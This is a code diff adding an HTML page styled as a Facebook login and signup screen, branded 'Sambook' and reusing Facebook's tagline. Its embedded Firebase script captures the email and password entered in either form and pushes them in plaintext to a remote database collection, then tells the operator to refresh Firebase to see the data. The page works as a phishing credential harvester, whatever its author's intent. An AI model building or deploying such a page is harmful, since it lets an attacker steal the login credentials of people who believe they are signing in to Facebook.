@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Clone - Login or Signup</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="fb-text">
+            <h1>Sambook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="form-box">
+            <!-- Login Form -->
+            <form id="loginForm">
+                <input type="email" id="loginEmail" placeholder="Email address or phone number" required>
+                <input type="password" id="loginPass" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="#">Forgotten password?</a>
+                <hr>
+                <button type="button" class="create-btn" onclick="toggleForm()">Create New Account</button>
+            </form>
+
+            <!-- Signup Form (Initially Hidden) -->
+            <form id="signupForm" style="display: none;">
+                <h3>Sign Up</h3>
+                <p>It's quick and easy.</p>
+                <hr>
+                <input type="text" id="newName" placeholder="Full Name" required>
+                <input type="email" id="newEmail" placeholder="Email or Phone" required>
+                <input type="password" id="newPass" placeholder="New Password" required>
+                <button type="submit" class="signup-btn">Sign Up</button>
+                <p onclick="toggleForm()" style="cursor:pointer; color:#1877f2; margin-top:10px;">Already have an account?</p>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+<!-- Firebase SDK (Realtime Database Version) -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";
+
+  // আপনার দেওয়া আগের কনফিগ
+  const firebaseConfig = {
+    apiKey: "AIzaSyAIYioLXvzn6-dqhwsyI5-ZkWaMLDlagTA",
+    authDomain: "sambook-99fd2.firebaseapp.com",
+    projectId: "sambook-99fd2",
+    storageBucket: "sambook-99fd2.firebasestorage.app",
+    messagingSenderId: "1050142341756",
+    appId: "1:1050142341756:web:c2bcf81ac6663ab1db27f9",
+    measurementId: "G-ESYYS2VZZN"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  window.saveData = (e, type) => {
+    e.preventDefault();
+    let data = {};
+    if(type === 'login') {
+      data = {
+        email: document.getElementById('loginEmail').value,
+        pass: document.getElementById('loginPass').value,
+        action: 'login',
+        time: new Date().toString()
+      };
+    } else {
+      data = {
+        name: document.getElementById('newName').value,
+        email: document.getElementById('newEmail').value,
+        pass: document.getElementById('newPass').value,
+        action: 'signup',
+        time: new Date().toString()
+      };
+    }
+
+    // ডাটা সেভ করা
+    push(ref(db, 'users_data/'), data)
+    .then(() => {
+      alert("Data sent! Refresh Firebase to see it.");
+      location.reload();
+    })
+    .catch((err) => alert("Error: " + err.message));
+  };
+
+  document.getElementById('loginForm').onsubmit = (e) => saveData(e, 'login');
+  document.getElementById('signupForm').onsubmit = (e) => saveData(e, 'signup');
+</script>
+</body>
+</html>
